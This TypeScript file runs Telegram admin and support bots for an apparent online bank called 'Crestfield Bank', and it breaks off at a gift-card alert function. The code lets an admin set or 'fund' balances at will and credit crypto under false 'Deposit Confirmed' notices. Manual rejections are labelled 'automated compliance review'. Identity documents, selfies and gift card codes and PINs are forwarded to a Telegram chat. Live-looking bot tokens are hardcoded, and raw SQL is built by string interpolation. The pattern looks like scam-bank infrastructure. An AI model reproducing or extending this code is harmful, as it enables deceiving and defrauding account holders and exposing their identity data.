// @ts-nocheck
import TelegramBot from "node-telegram-bot-api";
import { db } from "@workspace/db";
import {
  transactionsTable, usersTable, walletsTable, kycTable,
  notificationsTable, adminLogsTable, cryptoSwapsTable,
  cardsTable, supportMessagesTable,
} from "@workspace/db";
import { eq, sql, and } from "drizzle-orm";
import { logger } from "./logger.js";
import { broadcastToUser } from "./websocket.js";

const ADMIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8672597324:AAEy7rwQCo8bf32lTmLd9xqss25HHcrtkzE";
const SUPPORT_BOT_TOKEN = process.env.TELEGRAM_SUPPORT_BOT_TOKEN || "8608254109:AAGo-ebQtzO1spKBVadx2UhhrgNpw-YkJy0";
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID || "5357319463";

let adminBot: TelegramBot | null = null;
let supportBot: TelegramBot | null = null;
let initializedMode: "polling" | "webhook" | null = null;

export function getAdminBot(): TelegramBot | null { return adminBot; }
export function getSupportBot(): TelegramBot | null { return supportBot; }
export type BotMode = "polling" | "webhook";

export async function initTelegramBots() {
  // Automatically use webhook mode if deployed on Vercel, otherwise polling for local dev
  const mode: BotMode = process.env.VERCEL ? "webhook" : "polling";

  if (initializedMode === mode && adminBot && supportBot) return;

  if (!ADMIN_BOT_TOKEN) {
    logger.warn("TELEGRAM_BOT_TOKEN not set, admin bot disabled");
    return;
  }
  
  const opts = mode === "polling" ? { polling: true } : {};
  adminBot = new TelegramBot(ADMIN_BOT_TOKEN, opts);
  
  if (SUPPORT_BOT_TOKEN) {
    supportBot = new TelegramBot(SUPPORT_BOT_TOKEN, opts);
    setupSupportBotHandlers(supportBot);
  }

  setupAdminBotHandlers(adminBot);
  initializedMode = mode;
  logger.info({ mode }, "Telegram bots initialized successfully");
}

export function processTelegramUpdate(botType: "admin" | "support", update: unknown): void {
  const bot = botType === "admin" ? adminBot : supportBot;
  if (!bot) {
    logger.warn({ botType }, "Received webhook update but bot not initialized");
    return;
  }
  bot.processUpdate(update as TelegramBot.Update);
}

export async function setTelegramWebhooks(baseUrl: string, secretToken: string): Promise<{ adminUrl: string; supportUrl: string }> {
  if (!adminBot) await initTelegramBots();
  if (!adminBot) throw new Error("Bots could not be initialized");
  
  const adminUrl = `${baseUrl}/api/telegram/webhook/admin`;
  await adminBot.setWebHook(adminUrl, { secret_token: secretToken });
  
  let supportUrl = "";
  if (supportBot) {
    supportUrl = `${baseUrl}/api/telegram/webhook/support`;
    await supportBot.setWebHook(supportUrl, { secret_token: secretToken });
  }
  return { adminUrl, supportUrl };
}

// ==========================================
// ALL HANDLERS BELOW REMAIN EXACTLY THE SAME
// ==========================================

function setupAdminBotHandlers(bot: TelegramBot) {
  bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "Crestfield Bank Admin Bot\n\nCommands:\n/users - List recent users\n/user <id> - User details\n/freeze <id> - Freeze user\n/unfreeze <id> - Unfreeze user\n/setbalance <id> <amount> - Set user balance\n/fund <accountNumber> <amount> <reason> - Fund user\n/logs - Recent admin logs");
  });

  bot.onText(/\/users/, async (msg): Promise<void> => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    try {
      const users = await db.select({
        id: usersTable.id, email: usersTable.email, username: usersTable.username,
        status: usersTable.status, kycLevel: usersTable.kycLevel, accountNumber: usersTable.accountNumber,
      }).from(usersTable).limit(10).orderBy(sql`${usersTable.createdAt} DESC`);

      const text = users.map(u => `ID: ${u.id} | @${u.username} | ${u.email}\nStatus: ${u.status} | KYC: ${u.kycLevel}\nAcc: ${u.accountNumber}`).join("\n\n");
      bot.sendMessage(msg.chat.id, text || "No users found");
    } catch (e) { bot.sendMessage(msg.chat.id, "Error fetching users"); }
  });

  bot.onText(/\/user (\d+)/, async (msg, match): Promise<void> => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    const userId = parseInt(match![1]);
    try {
      const [user] = await db.select().from(usersTable).where(eq(usersTable.id, userId));
      const [wallet] = await db.select().from(walletsTable).where(eq(walletsTable.userId, userId));
      if (!user) { bot.sendMessage(msg.chat.id, "User not found"); return; }
      bot.sendMessage(msg.chat.id, `User #${user.id}\nEmail: ${user.email}\nUsername: @${user.username}\nPhone: ${user.phone}\nCountry: ${user.country}\nStatus: ${user.status}\nKYC Level: ${user.kycLevel}\nAccount: ${user.accountNumber}\nBalance: $${wallet?.balance || "0.00"}\nPending: $${wallet?.pendingBalance || "0.00"}`);
    } catch (e) { bot.sendMessage(msg.chat.id, "Error fetching user"); }
  });

  bot.onText(/\/freeze (\d+)/, async (msg, match) => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    const userId = parseInt(match![1]);
    try {
      await db.update(usersTable).set({ status: "frozen" }).where(eq(usersTable.id, userId));
      await db.insert(adminLogsTable).values({ action: "freeze_user", targetUserId: userId, details: "User frozen via Telegram" });
      bot.sendMessage(msg.chat.id, `User #${userId} has been frozen`);
    } catch (e) { bot.sendMessage(msg.chat.id, "Error freezing user"); }
  });

  bot.onText(/\/unfreeze (\d+)/, async (msg, match) => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    const userId = parseInt(match![1]);
    try {
      await db.update(usersTable).set({ status: "active" }).where(eq(usersTable.id, userId));
      await db.insert(adminLogsTable).values({ action: "unfreeze_user", targetUserId: userId, details: "User unfrozen via Telegram" });
      bot.sendMessage(msg.chat.id, `User #${userId} has been unfrozen`);
    } catch (e) { bot.sendMessage(msg.chat.id, "Error unfreezing user"); }
  });

  bot.onText(/\/setbalance (\d+) ([\d.]+)/, async (msg, match) => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    const userId = parseInt(match![1]);
    const amount = parseFloat(match![2]);
    try {
      await db.update(walletsTable).set({ balance: amount.toString() }).where(eq(walletsTable.userId, userId));
      await db.insert(adminLogsTable).values({ action: "set_balance", targetUserId: userId, details: `Balance set to $${amount}` });
      bot.sendMessage(msg.chat.id, `User #${userId} balance set to $${amount}`);
    } catch (e) { bot.sendMessage(msg.chat.id, "Error setting balance"); }
  });

  bot.onText(/\/fund (.+) ([\d.]+) (.+)/, async (msg, match): Promise<void> => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    const accountNumber = match![1].trim();
    const amount = parseFloat(match![2]);
    const reason = match![3].trim();
    try {
      const [user] = await db.select().from(usersTable).where(eq(usersTable.accountNumber, accountNumber));
      if (!user) { bot.sendMessage(msg.chat.id, "User not found with that account number"); return; }

      await db.update(walletsTable)
        .set({ balance: sql`${walletsTable.balance} + ${amount}` })
        .where(eq(walletsTable.userId, user.id));

      const [tx] = await db.insert(transactionsTable).values({
        type: "admin_fund", amount: amount.toString(), status: "completed", receiverId: user.id, note: reason,
      }).returning();

      await db.insert(notificationsTable).values({
        userId: user.id, type: "transaction", title: "Account Credited",
        message: `$${amount.toFixed(2)} has been credited to your account. Narration: ${reason}`,
      });

      await db.insert(adminLogsTable).values({
        action: "fund_user", targetUserId: user.id, details: `Funded $${amount} to ${accountNumber}. Reason: ${reason}`,
      });

      broadcastToUser(user.id, { type: "balance_update", data: { transactionId: tx.id } });
      bot.sendMessage(msg.chat.id, `Successfully funded $${amount} to ${user.username} (${accountNumber})\nReason: ${reason}`);
    } catch (e) { bot.sendMessage(msg.chat.id, "Error funding user"); }
  });

  bot.onText(/\/credit_crypto (\S+) (btc|eth|usdt|sol|xrp) ([\d.]+)/i, async (msg, match): Promise<void> => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    const username = match![1].trim().replace(/^@/, "");
    const asset = match![2].toLowerCase();
    const amount = parseFloat(match![3]);
    if (!Number.isFinite(amount) || amount <= 0) {
      bot.sendMessage(msg.chat.id, "Invalid amount"); return;
    }
    try {
      const [user] = await db.select().from(usersTable).where(eq(usersTable.username, username));
      if (!user) { bot.sendMessage(msg.chat.id, "User not found"); return; }

      const balanceCol = `${asset}_balance`;
      const result = await db.execute(sql.raw(`UPDATE crypto_wallets SET ${balanceCol} = ${balanceCol} + ${amount} WHERE user_id = ${user.id} RETURNING ${balanceCol}`));
      if (!result.rows || result.rows.length === 0) {
        bot.sendMessage(msg.chat.id, `${user.username} has no crypto wallet yet`); return;
      }

      await db.insert(notificationsTable).values({
        userId: user.id, type: "transaction", title: "Crypto Deposit Confirmed", message: `${amount} ${asset.toUpperCase()} has been credited to your crypto wallet.`,
      });
      await db.insert(adminLogsTable).values({
        action: "credit_crypto", targetUserId: user.id, details: `Credited ${amount} ${asset.toUpperCase()} to ${user.username}`,
      });
      broadcastToUser(user.id, { type: "balance_update", data: { asset } });
      bot.sendMessage(msg.chat.id, `Credited ${amount} ${asset.toUpperCase()} to @${user.username}`);
    } catch (e) {
      logger.error({ e }, "Error crediting crypto");
      bot.sendMessage(msg.chat.id, "Error crediting crypto balance");
    }
  });

  bot.on("message", async (msg) => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    if (!msg.text || msg.text.startsWith("/")) return;

    const replyTo = msg.reply_to_message;
    if (!replyTo || !replyTo.text) return;

    const fundMatch = replyTo.text.match(/^💰 Funding @(\S+) \(([^)]+)\)/);
    if (!fundMatch) return;

    const accountNumber = fundMatch[2];
    const parts = msg.text.trim().split(/\s+/);
    const amount = parseFloat(parts[0]);
    const reason = parts.slice(1).join(" ").trim();

    if (isNaN(amount) || amount <= 0) {
      bot.sendMessage(msg.chat.id, "⚠️ Invalid amount. Reply with: <amount> <narration>\nExample: 5000 Welcome bonus"); return;
    }
    if (!reason) {
      bot.sendMessage(msg.chat.id, "⚠️ A narration is required. Reply with: <amount> <narration>\nExample: 5000 Welcome bonus"); return;
    }

    try {
      const [user] = await db.select().from(usersTable).where(eq(usersTable.accountNumber, accountNumber));
      if (!user) { bot.sendMessage(msg.chat.id, "User not found"); return; }

      await db.update(walletsTable).set({ balance: sql`${walletsTable.balance} + ${amount}`, updatedAt: new Date() }).where(eq(walletsTable.userId, user.id));

      const [tx] = await db.insert(transactionsTable).values({
        type: "admin_fund", amount: amount.toString(), status: "completed", receiverId: user.id, note: reason,
      }).returning();

      await db.insert(notificationsTable).values({
        userId: user.id, type: "transaction", title: "Account Credited", message: `$${amount.toFixed(2)} has been credited to your account. Narration: ${reason}`,
      });

      await db.insert(adminLogsTable).values({
        action: "fund_user", targetUserId: user.id, details: `Funded $${amount} to ${accountNumber}. Reason: ${reason}`,
      });

      broadcastToUser(user.id, { type: "balance_update", data: { transactionId: tx.id } });
      bot.sendMessage(msg.chat.id, `✅ Successfully funded $${amount.toFixed(2)} to @${user.username} (${accountNumber})\nReason: ${reason}`);
    } catch (e) {
      logger.error({ e }, "Error processing fund reply");
      bot.sendMessage(msg.chat.id, "❌ Error funding user");
    }
  });

  bot.onText(/\/logs/, async (msg) => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    try {
      const logs = await db.select().from(adminLogsTable).limit(10).orderBy(sql`${adminLogsTable.createdAt} DESC`);
      const text = logs.map(l => `${l.action} | User:${l.targetUserId || "N/A"}\n${l.details || ""}\n${l.createdAt}`).join("\n\n");
      bot.sendMessage(msg.chat.id, text || "No logs found");
    } catch (e) { bot.sendMessage(msg.chat.id, "Error fetching logs"); }
  });

  bot.on("callback_query", async (query) => {
    const data = query.data || "";
    const chatId = query.message?.chat.id;
    if (!chatId) return;

    if (!ADMIN_CHAT_ID || String(chatId) !== ADMIN_CHAT_ID) {
      bot.answerCallbackQuery(query.id, { text: "Unauthorized" }).catch(() => {});
      return;
    }

    if (data.startsWith("approve_tx_") || data.startsWith("reject_tx_")) {
      const isApprove = data.startsWith("approve_tx_");
      const txId = parseInt(data.replace(isApprove ? "approve_tx_" : "reject_tx_", ""));

      try {
        const nextStatus = isApprove ? "completed" : "failed";
        const claimed = await db.update(transactionsTable)
          .set({ status: nextStatus, updatedAt: new Date(), ...(isApprove ? {} : { declineReason: "Declined by automated compliance review" }) })
          .where(and(eq(transactionsTable.id, txId), eq(transactionsTable.status, "pending")))
          .returning();
          
        if (claimed.length === 0) {
          const [existing] = await db.select().from(transactionsTable).where(eq(transactionsTable.id, txId));
          bot.answerCallbackQuery(query.id, { text: existing ? "Transaction already processed" : "Transaction not found" });
          return;
        }
        const tx = claimed[0];

        if (isApprove) {
          if (tx.type === "transfer" && tx.senderId && tx.receiverId) {
            await db.update(walletsTable).set({ balance: sql`${walletsTable.balance} - ${tx.amount}`, updatedAt: new Date() }).where(eq(walletsTable.userId, tx.senderId));
            await db.update(walletsTable).set({ balance: sql`${walletsTable.balance} + ${tx.amount}`, updatedAt: new Date() }).where(eq(walletsTable.userId, tx.receiverId));
            await db.insert(notificationsTable).values([
              { userId: tx.senderId, type: "transaction", title: "Transfer Approved", message: `Your transfer of $${tx.amount} has been processed successfully.` },
              { userId: tx.receiverId, type: "transaction", title: "Funds Received", message: `You have received $${tx.amount}.` },
            ]);
            broadcastToUser(tx.senderId, { type: "transaction_update", data: { transactionId: txId, status: "completed" } });
            broadcastToUser(tx.receiverId, { type: "balance_update", data: { transactionId: txId } });
          } else if (tx.type === "withdrawal" && tx.senderId) {
            await db.update(walletsTable).set({ balance: sql`${walletsTable.balance} - ${tx.amount}`, updatedAt: new Date() }).where(eq(walletsTable.userId, tx.senderId));
            await db.insert(notificationsTable).values({ userId: tx.senderId, type: "transaction", title: "Withdrawal Approved", message: `Your withdrawal of $${tx.amount} has been processed.` });
            broadcastToUser(tx.senderId, { type: "transaction_update", data: { transactionId: txId, status: "completed" } });
          } else if (tx.type === "gift_card" && tx.receiverId) {
            await db.update(walletsTable).set({ balance: sql`${walletsTable.balance} + ${tx.amount}`, updatedAt: new Date() }).where(eq(walletsTable.userId, tx.receiverId));
            await db.insert(notificationsTable).values({ userId: tx.receiverId, type: "transaction", title: "Gift Card Redeemed", message: `Your gift card worth $${tx.amount} has been successfully credited to your account.` });
            broadcastToUser(tx.receiverId, { type: "balance_update", data: { transactionId: txId } });
          }

          await db.insert(adminLogsTable).values({ action: "approve_transaction", details: `Approved TX #${txId} - ${tx.type} $${tx.amount}` });
          bot.answerCallbackQuery(query.id, { text: "Transaction approved!" });
          bot.editMessageText(`Transaction #${txId} - APPROVED\nType: ${tx.type}\nAmount: $${tx.amount}`, { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } });
        } else {
          await db.update(transactionsTable).set({ status: "failed", declineReason: "Declined by automated compliance review", updatedAt: new Date() }).where(eq(transactionsTable.id, txId));
          if (tx.senderId) {
            await db.insert(notificationsTable).values({ userId: tx.senderId, type: "transaction", title: "Transaction Declined", message: `Your ${tx.type} of $${tx.amount} has been declined.` });
            broadcastToUser(tx.senderId, { type: "transaction_update", data: { transactionId: txId, status: "failed" } });
          }
          await db.insert(adminLogsTable).values({ action: "reject_transaction", details: `Rejected TX #${txId} - ${tx.type} $${tx.amount}` });
          bot.answerCallbackQuery(query.id, { text: "Transaction rejected" });
          bot.editMessageText(`Transaction #${txId} - REJECTED\nType: ${tx.type}\nAmount: $${tx.amount}`, { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } });
        }
      } catch (e) {
        logger.error({ e }, "Error processing transaction callback");
        bot.answerCallbackQuery(query.id, { text: "Error processing" });
      }
    }

    if (data.startsWith("approve_swap_") || data.startsWith("reject_swap_")) {
      const isApprove = data.startsWith("approve_swap_");
      const swapId = parseInt(data.replace(isApprove ? "approve_swap_" : "reject_swap_", ""));

      try {
        const nextStatus = isApprove ? "approved" : "rejected";
        const claimedSwap = await db.update(cryptoSwapsTable)
          .set({ status: nextStatus, updatedAt: new Date(), ...(isApprove ? {} : { declineReason: "Declined by automated compliance review" }) })
          .where(and(eq(cryptoSwapsTable.id, swapId), eq(cryptoSwapsTable.status, "pending")))
          .returning();
          
        if (claimedSwap.length === 0) {
          const [existing] = await db.select().from(cryptoSwapsTable).where(eq(cryptoSwapsTable.id, swapId));
          bot.answerCallbackQuery(query.id, { text: existing ? "Swap already processed" : "Swap not found" });
          return;
        }
        const swap = claimedSwap[0];

        if (isApprove) {
          const balanceCol = `${swap.asset}_balance`;
          await db.execute(sql.raw(`UPDATE crypto_wallets SET ${balanceCol} = ${balanceCol} - ${parseFloat(swap.amount)} WHERE user_id = ${swap.userId}`));
          await db.update(walletsTable).set({ balance: sql`${walletsTable.balance} + ${swap.cashValue}`, updatedAt: new Date() }).where(eq(walletsTable.userId, swap.userId));

          await db.insert(notificationsTable).values({ userId: swap.userId, type: "transaction", title: "Crypto Swap Approved", message: `Your swap of ${swap.amount} ${swap.asset.toUpperCase()} has been processed. $${swap.cashValue} credited to your account.` });
          broadcastToUser(swap.userId, { type: "balance_update", data: { swapId } });
          await db.insert(adminLogsTable).values({ action: "approve_crypto_swap", details: `Approved swap #${swapId} - ${swap.amount} ${swap.asset.toUpperCase()} → $${swap.cashValue}` });

          bot.answerCallbackQuery(query.id, { text: "Swap approved & credited!" });
          bot.editMessageText(`Swap #${swapId} - APPROVED\n${swap.amount} ${swap.asset.toUpperCase()} → $${swap.cashValue}`, { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } });
        } else {
          await db.update(cryptoSwapsTable).set({ status: "rejected", declineReason: "Declined by automated compliance review", updatedAt: new Date() }).where(eq(cryptoSwapsTable.id, swapId));
          await db.insert(notificationsTable).values({ userId: swap.userId, type: "transaction", title: "Crypto Swap Declined", message: `Your swap of ${swap.amount} ${swap.asset.toUpperCase()} was declined. Your crypto remains in your wallet.` });
          broadcastToUser(swap.userId, { type: "transaction_update", data: { swapId, status: "rejected" } });
          await db.insert(adminLogsTable).values({ action: "reject_crypto_swap", details: `Rejected swap #${swapId} - ${swap.amount} ${swap.asset.toUpperCase()}` });

          bot.answerCallbackQuery(query.id, { text: "Swap rejected" });
          bot.editMessageText(`Swap #${swapId} - REJECTED\n${swap.amount} ${swap.asset.toUpperCase()}`, { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } });
        }
      } catch (e) {
        logger.error({ e }, "Error processing crypto swap callback");
        bot.answerCallbackQuery(query.id, { text: "Error processing swap" });
      }
      return;
    }

    if (data.startsWith("approve_card_") || data.startsWith("reject_card_")) {
      const isApprove = data.startsWith("approve_card_");
      const cardId = parseInt(data.replace(isApprove ? "approve_card_" : "reject_card_", ""));

      try {
        const nextStatus = isApprove ? "active" : "rejected";
        const txResult = await db.transaction(async (tx) => {
          const claimed = await tx.update(cardsTable)
            .set({ status: nextStatus, reviewedAt: new Date(), updatedAt: new Date(), ...(isApprove ? {} : { declineReason: "Card did not pass automated verification" }) })
            .where(and(eq(cardsTable.id, cardId), eq(cardsTable.status, "pending_activation")))
            .returning();
            
          if (claimed.length === 0) {
            const [existing] = await tx.select().from(cardsTable).where(eq(cardsTable.id, cardId));
            return { error: existing ? `Card already ${existing.status}` : "Card not found" } as const;
          }
          const card = claimed[0];

          let refundNote = "";
          if (!isApprove && card.kind === "virtual" && card.activationFee && card.activationTxId) {
            const fee = parseFloat(card.activationFee);
            await tx.update(walletsTable).set({ balance: sql`${walletsTable.balance} + ${fee}`, updatedAt: new Date() }).where(eq(walletsTable.userId, card.userId));
            await tx.update(transactionsTable).set({ status: "failed", declineReason: "Card activation declined — fee refunded", updatedAt: new Date() }).where(eq(transactionsTable.id, card.activationTxId));
            refundNote = ` $${fee.toFixed(2)} has been refunded to your portfolio.`;
          }

          if (isApprove) {
            await tx.insert(notificationsTable).values({ userId: card.userId, type: "card", title: "Card Activated", message: card.kind === "virtual" ? `Your virtual card ****${card.last4} is now active and ready to use.` : `Your ${card.brand} card ****${card.last4} has been verified and is now active.` });
            await tx.insert(adminLogsTable).values({ action: "approve_card", targetUserId: card.userId, details: `Approved ${card.kind} card #${cardId} (****${card.last4})` });
          } else {
            await tx.insert(notificationsTable).values({ userId: card.userId, type: "card", title: card.kind === "virtual" ? "Card Activation Declined" : "Card Verification Declined", message: card.kind === "virtual" ? `Your virtual card ****${card.last4} could not be activated.${refundNote}` : `Your ${card.brand} card ****${card.last4} could not be verified. Please review the details and try again.` });
            await tx.insert(adminLogsTable).values({ action: "reject_card", targetUserId: card.userId, details: `Rejected ${card.kind} card #${cardId} (****${card.last4})${refundNote ? " — fee refunded" : ""}` });
          }
          return { ok: { card, refundNote } } as const;
        });

        if ("error" in txResult && txResult.error) {
          bot.answerCallbackQuery(query.id, { text: txResult.error });
          return;
        }
        if (!("ok" in txResult) || !txResult.ok) {
          bot.answerCallbackQuery(query.id, { text: "Error processing card" });
          return;
        }
        const { card, refundNote } = txResult.ok;

        broadcastToUser(card.userId, { type: "card_status", data: { cardId, status: nextStatus } });
        if (!isApprove && refundNote) broadcastToUser(card.userId, { type: "balance_update", data: {} });

        bot.answerCallbackQuery(query.id, { text: isApprove ? "Card approved!" : "Card rejected" });
        bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message?.message_id }).catch(() => {});
        bot.sendMessage(chatId, isApprove ? `✅ Card #${cardId} APPROVED — now ACTIVE` : `❌ Card #${cardId} REJECTED${refundNote ? " — $50 refunded to user" : ""}`);
      } catch (e) {
        logger.error({ e }, "Error processing card callback");
        bot.answerCallbackQuery(query.id, { text: "Error processing card" });
      }
      return;
    }

    if (data.startsWith("freeze_user_") || data.startsWith("unfreeze_user_")) {
      const isFreeze = data.startsWith("freeze_user_");
      const userId = parseInt(data.replace(isFreeze ? "freeze_user_" : "unfreeze_user_", ""));

      try {
        const [user] = await db.select().from(usersTable).where(eq(usersTable.id, userId));
        if (!user) {
          bot.answerCallbackQuery(query.id, { text: "User not found" });
          return;
        }

        const newStatus = isFreeze ? "frozen" : "active";
        await db.update(usersTable).set({ status: newStatus }).where(eq(usersTable.id, userId));
        await db.insert(adminLogsTable).values({ action: isFreeze ? "freeze_user" : "unfreeze_user", targetUserId: userId, details: `User ${isFreeze ? "frozen" : "unfrozen"} via Telegram inline button` });
        await db.insert(notificationsTable).values({ userId, type: "account", title: isFreeze ? "Account Frozen" : "Account Reactivated", message: isFreeze ? "Your account has been temporarily frozen for a security review. Please contact support." : "Your account has been reactivated. Welcome back!" });
        broadcastToUser(userId, { type: "account_status", data: { status: newStatus } });

        bot.answerCallbackQuery(query.id, { text: isFreeze ? "User frozen" : "User unfrozen" });
        const newKeyboard = [[
          isFreeze ? { text: "♻️ Unfreeze", callback_data: `unfreeze_user_${userId}` } : { text: "🧊 Freeze", callback_data: `freeze_user_${userId}` },
          { text: "💰 Fund", callback_data: `fund_user_${userId}` },
        ]];
        bot.editMessageReplyMarkup({ inline_keyboard: newKeyboard }, { chat_id: chatId, message_id: query.message?.message_id }).catch(() => {});
      } catch (e) {
        logger.error({ e }, "Error processing freeze callback");
        bot.answerCallbackQuery(query.id, { text: "Error processing" });
      }
      return;
    }

    if (data.startsWith("fund_user_")) {
      const userId = parseInt(data.replace("fund_user_", ""));
      try {
        const [user] = await db.select().from(usersTable).where(eq(usersTable.id, userId));
        if (!user) { bot.answerCallbackQuery(query.id, { text: "User not found" }); return; }

        bot.answerCallbackQuery(query.id, { text: "Reply with the amount" });
        await bot.sendMessage(chatId, `💰 Funding @${user.username} (${user.accountNumber})\n\nReply to this message with: <amount> <narration>\nNarration is REQUIRED.\nExample: 5000 Welcome bonus`, { reply_markup: { force_reply: true, selective: true } });
      } catch (e) {
        logger.error({ e }, "Error initiating fund");
        bot.answerCallbackQuery(query.id, { text: "Error" });
      }
      return;
    }

    if (data.startsWith("approve_kyc_") || data.startsWith("reject_kyc_")) {
      const isApprove = data.startsWith("approve_kyc_");
      const kycId = parseInt(data.replace(isApprove ? "approve_kyc_" : "reject_kyc_", ""));

      try {
        const [kyc] = await db.select().from(kycTable).where(eq(kycTable.id, kycId));
        if (!kyc) { bot.answerCallbackQuery(query.id, { text: "KYC not found" }); return; }

        const tier = kyc.tier ?? 2;
        const tierLabel = tier === 3 ? "Tier 3 (Address)" : "Tier 2 (Identity)";

        if (isApprove) {
          const newLevel = tier === 3 ? 2 : 1;
          await db.update(kycTable).set({ status: "approved", reviewedAt: new Date() }).where(eq(kycTable.id, kycId));
          await db.update(usersTable).set({ kycLevel: newLevel }).where(eq(usersTable.id, kyc.userId));
          await db.insert(notificationsTable).values({ userId: kyc.userId, type: "kyc", title: tier === 3 ? "Address Verified" : "Identity Verified", message: tier === 3 ? "Your proof of address has been verified. You now have unlimited Tier 3 access." : "Your identity has been verified. You can now submit proof of address to unlock Tier 3." });
          broadcastToUser(kyc.userId, { type: "kyc_update", data: { status: "approved", tier, level: newLevel } });
          bot.answerCallbackQuery(query.id, { text: `${tierLabel} Approved!` });
          bot.editMessageText(`KYC #${kycId} - ${tierLabel} APPROVED\nUser: ${kyc.fullName}`, { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } });
        } else {
          await db.update(kycTable).set({ status: "rejected", rejectionReason: "Documents not accepted", reviewedAt: new Date() }).where(eq(kycTable.id, kycId));
          await db.insert(notificationsTable).values({ userId: kyc.userId, type: "kyc", title: "Verification Unsuccessful", message: tier === 3 ? "Your address verification was not approved. Please resubmit with a clearer document." : "Your identity verification was not approved. Please resubmit with clearer documents." });
          broadcastToUser(kyc.userId, { type: "kyc_update", data: { status: "rejected", tier } });
          bot.answerCallbackQuery(query.id, { text: `${tierLabel} Rejected` });
          bot.editMessageText(`KYC #${kycId} - ${tierLabel} REJECTED\nUser: ${kyc.fullName}`, { chat_id: chatId, message_id: query.message?.message_id, reply_markup: { inline_keyboard: [] } });
        }
      } catch (e) { bot.answerCallbackQuery(query.id, { text: "Error processing KYC" }); }
    }
  });
}

function setupSupportBotHandlers(bot: TelegramBot) {
  bot.on("message", async (msg) => {
    if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
    if (!msg.text || msg.text.startsWith("/")) return;

    const replyToId = msg.reply_to_message?.message_id;
    if (!replyToId) { bot.sendMessage(msg.chat.id, "Reply to a user message to respond to them"); return; }

    try {
      const [originalMsg] = await db.select().from(supportMessagesTable).where(eq(supportMessagesTable.telegramMessageId, replyToId));
      if (!originalMsg) { bot.sendMessage(msg.chat.id, "Could not find original message"); return; }

      await db.insert(supportMessagesTable).values({ userId: originalMsg.userId, message: msg.text, isFromUser: false });
      await db.insert(notificationsTable).values({ userId: originalMsg.userId, type: "support", title: "New Support Reply", message: "You have a new message from our support team." });

      broadcastToUser(originalMsg.userId, { type: "support_message", data: { message: msg.text } });
      bot.sendMessage(msg.chat.id, "Reply sent to user");
    } catch (e) { bot.sendMessage(msg.chat.id, "Error sending reply"); }
  });
}

export async function sendTransactionAlert(txId: number, type: string, amount: string, senderInfo: string, receiverInfo: string, extraDetails?: string) {
  if (!adminBot || !ADMIN_CHAT_ID) return null;
  try {
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `🚨 ${type.toUpperCase()} REQUEST\n\nFrom: ${senderInfo}\nTo: ${receiverInfo}\nAmount: $${amount}${extraDetails ? "\n" + extraDetails : ""}\n\nTransaction ID: #${txId}`, { reply_markup: { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_tx_${txId}` }, { text: "❌ Reject", callback_data: `reject_tx_${txId}` }]] } });
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending transaction alert"); return null; }
}

export async function sendKycAlert(opts: { kycId: number; userId: number; username: string; email: string; tier: number; fullName: string; idType: string; idNumber: string; country: string; frontImage: string; backImage?: string | null; selfieImage?: string | null; }) {
  if (!adminBot || !ADMIN_CHAT_ID) return null;
  try {
    const tierLabel = opts.tier === 3 ? "Tier 3 — Proof of Address" : "Tier 2 — Identity Verification";
    const msg = await adminBot.sendMessage(ADMIN_CHAT_ID, `📋 ${tierLabel.toUpperCase()}\n\nKYC ID: #${opts.kycId}\nUser: @${opts.username} (#${opts.userId})\nEmail: ${opts.email}\nFull Name: ${opts.fullName}\nDocument: ${opts.idType.replace(/_/g, " ")}\nDocument #: ${opts.idNumber}\nCountry: ${opts.country}\n\nDocuments are attached below.`, { reply_markup: { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_kyc_${opts.kycId}` }, { text: "❌ Reject", callback_data: `reject_kyc_${opts.kycId}` }]] } });

    const sendImg = async (dataUrl: string | null | undefined, caption: string, file: string) => {
      if (!dataUrl) return;
      const buf = dataUrlToBuffer(dataUrl);
      if (!buf) return;
      await adminBot!.sendPhoto(ADMIN_CHAT_ID!, buf, { caption }, { filename: file, contentType: "image/jpeg" }).catch((e) => logger.error({ e, file }, "Error sending KYC photo"));
    };

    await sendImg(opts.frontImage, `KYC #${opts.kycId} — ${opts.tier === 3 ? "Address Document" : "Document FRONT"}`, `kyc${opts.kycId}-front.jpg`);
    if (opts.backImage) await sendImg(opts.backImage, `KYC #${opts.kycId} — Document BACK`, `kyc${opts.kycId}-back.jpg`);
    if (opts.selfieImage) await sendImg(opts.selfieImage, `KYC #${opts.kycId} — Selfie`, `kyc${opts.kycId}-selfie.jpg`);
    return msg.message_id;
  } catch (e) { logger.error({ e }, "Error sending KYC alert"); return null; }
}

export async function sendSupportMessageToAdmin(userId: number, username: string, message: string, telegramMsgId: number) {
  if (!supportBot || !ADMIN_CHAT_ID) return;
  try { await supportBot.sendMessage(ADMIN_CHAT_ID, `💬 SUPPORT MESSAGE\n\nFrom: @${username} (User #${userId})\n\n${message}\n\nReply to this message to respond to the user.`); } catch (e) { logger.error({ e }, "Error sending support message to admin"); }
}

function dataUrlToBuffer(dataUrl: string): Buffer | null {
  try {
    const m = dataUrl.match(/^data:([^;]+);base64,(.+)$/);
    const base64 = m ? m[2] : dataUrl;
    return Buffer.from(base64, "base64");
  } catch { return null; }
}

export async function sendGiftCardAlert(opts: { txId: number; userId: number; username: string; brand: string; code: string; pin?: string | null; amount: string; frontImage?: string; backImage?: string; }) {
